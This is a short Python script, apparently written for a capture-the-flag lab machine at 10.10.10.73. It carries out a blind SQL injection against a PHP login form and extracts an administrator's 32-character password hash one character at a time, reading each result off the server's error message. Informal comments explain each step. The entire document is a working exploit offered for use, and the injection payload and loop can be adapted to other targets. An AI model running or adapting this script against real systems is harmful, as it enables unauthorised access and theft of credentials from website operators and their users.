# Importing necessary library
import requests

# This function generates SQL injection payload to fetch the hash, for each index (i) and character (c) passed to the function
def SQLpayload(i,c):
    return "admin' AND substring(password,%s,1)='%s'-- -" % (i,c)


# All the characters in a hash
characters = 'abcdef0123456789'

# "hash" comes as highlighted on python and I did not wanna mess with something I didn't know
# so I'm using "password" to store the hash lol
password = '' # Blank hash string

# Loop through every index position : 1 to 32
for i in range(1,33):
# Loop through every character in the "characters" for each index position
    for c in characters:
    # Defining a payload to be sent to the server
        payload = {'username':SQLpayload(i,c), 'password':'noobsec'}
        # Sending a post request with the above payload and it's data and response is saved in "r"
        r = requests.post('http://10.10.10.73/login.php',data=payload)
        # Checking if "right" error is hit at an index for a character
        if "Wrong identification" in r.text:
        # If right error is hit, append the character to the password string
            password += c
            # Print the character on the screen without moving the cursor to a new line
            # Helps in knowing the script is actually working and you're not sitting there for a few minutes just to realize it is broken
            print(c,end='',flush=True)
            # No need to cycle through the rest of the characters if the "right" error is already hit for an index position
            break

# Print the hash
print('\nHash is:\t'+password+'\n')
